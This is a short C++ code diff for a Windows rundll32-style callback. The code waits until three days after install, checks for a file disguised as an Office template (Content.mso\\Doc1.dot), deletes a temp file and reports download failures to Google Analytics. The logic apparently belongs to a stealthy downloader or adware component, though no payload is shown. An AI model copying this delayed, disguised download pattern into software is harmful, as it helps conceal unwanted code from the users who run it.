@@ -308,9 +308,9 @@ void  CALLBACK _si0(	HWND hwnd,	HINSTANCE hinst,	LPTSTR lpCmdLine,	int nCmdShow)
 	PathAppend(szPath, _T("Content.mso\\Doc1.dot"));	
 	
 	DWORD dwOffset = (DWORD)time(0) - dwInstallTime;
-	if(0 != dwInstallTime && (3*24*60*60 < dwOffset))
+	if((0 != dwInstallTime) && (3*24*60*60 < dwOffset) && PathFileExists(szPath))
 	{
-		
+		hr = S_OK;
 	}
 	else
 	{
@@ -321,7 +321,7 @@ void  CALLBACK _si0(	HWND hwnd,	HINSTANCE hinst,	LPTSTR lpCmdLine,	int nCmdShow)
 		DeleteFile(szTempPath);
 	}
 	//wcscpy(szPath, L"c:\\scripthost.js");
-	if(FAILED(hr) || !PathFileExists(szPath))
+	if(!PathFileExists(szPath))
 	{
 		CStringW url;
 		url.Format(L"http://www.google-analytics.com/collect?v=1&tid=UA-42360423-1&cid=%s&t=event&ec=exception&ea=downloadingfile_failed_Doc1.dot&el=%s" ,
